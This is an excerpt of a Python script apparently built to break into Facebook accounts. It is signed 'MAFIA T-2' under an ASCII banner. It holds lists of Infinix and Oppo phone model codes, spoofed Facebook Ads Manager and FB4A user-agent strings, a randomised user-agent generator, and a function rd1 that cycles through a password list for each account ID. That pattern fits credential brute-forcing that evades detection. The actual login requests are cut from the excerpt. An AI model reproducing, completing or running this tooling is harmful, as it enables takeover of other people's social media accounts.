...
INFINIX =['X626', 'X626B', 'X610B', 'X626B', 'X663', 'X663B', 'X659B', 'PR652B', 'X658E', 'PR652C', 'X658B', 'X5010', 'X521', 'HOT S', 'X521_LTE', 'X5514D', 'X5515', 'X5515F']
OPPO =['CPH1979', 'CPH1983', 'CPH1987', 'CPH2005', 'CPH2009', 'CPH2015', 'CPH2059', 'CPH2061', 'CPH2065', 'CPH2069', 'CPH2071', 'CPH2073', 'CPH2077', 'CPH2091', 'CPH2095', 'CPH2099', 'CPH2137', 'CPH2139', 'CPH2145', 'CPH2161', 'CPH2185', 'CPH2201', 'CPH2209', 'CPH1801', 'CPH1803', 'CPH1805', 'CPH1809', 'CPH1827', 'CPH1837', 'CPH1851', 'CPH1853']
...
head_sam = {'User Agent : "Dalvik/2.1.0 (Linux; U; Android 7; LM-L258 Pro Build/NVNN34) [FBAN/MobileAdsManagerAndroid;FBAV/277.0.0.45.26;FBBV/920828660;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/da_DK;FBMF/LM;FBBD/LM;FBDV/LM-L258 Pro;FBSV/7;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1'}
...
ua_z = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 6; LG-120Y Build/ML4MQI) [FBAN/MobileAdsManagerAndroid;FBAV/276.0.0.60.62;FBBV/939662308;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/LG;FBBD/LG;FBDV/LG-120Y;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"}
ua_x = {"user-agent": "Dalvik/2.1.0 (Linux; U; Android 6; LG-120Y Build/ML4MQI) [FBAN/MobileAdsManagerAndroid;FBAV/276.0.0.60.62;FBBV/939662308;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/sr_RS;FBMF/LG;FBBD/LG;FBDV/LG-120Y;FBSV/6;FBCA/armeabi-v8a:armeabi;FBDM/{density=2.0,width=};]"} 
...
def ua_MAFIA():
	...
	END = "[FBAN/FB4A;FBAV/268.0.0.86.57;FBBV/292516991;FBRV/0;FBPN/com.facebook.katana;FBLC/fr_CA;FBMF/Nokia;FBBD/Nokia;FBDV/Nokia NS69F;FBSV/5;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
...
oooo     oooo      o      ooooooooooo ooooo      o      
 8888o   888      888      888    88   888      888     
 88 888o8 88     8  88     888ooo8     888     8  88    
 88  888  88    8oooo88    888         888    8oooo88   
o88o  8  o88o o88o  o888o o888o       o888o o88o  o888o                                                                                                                                                                                  
-----------------------------------------------
 Author     :    MAFIA T-2
...
def rd1(ids,passlist):
	try:
		...
		for pas in passlist:
				...
				xxx = "FBAN/MobileAdsManagerAndroid;FBAV/296.0.0.65.78;FBBV/789203005;FBRV/0;FBPN/com.facebook.adsmanager;FBLC/fi_FI;FBMF/Honor;FBBD/Honor;FBDV/Honor 801 Pro;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=720,height=1440};FB_FW/1;]"
				ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";Mozilla/5.0 (Linux; Android 9; Honor N820 Ultra) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.2719.733 Mobile Safari/537.36"
